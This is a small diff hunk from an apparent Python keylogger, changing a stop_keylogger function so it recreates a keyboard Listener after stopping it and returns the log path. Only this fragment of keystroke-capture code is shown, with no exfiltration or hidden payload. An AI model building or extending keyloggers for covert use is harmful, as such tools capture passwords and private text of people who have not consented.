@@ -60,7 +60,7 @@ def stop_keylogger():
     listener.stop()
     keylogger_active = False
     print("Keylogger stopped.")
-
+    listener = Listener(on_press=on_press)
     return keylogger_log_path
 
 
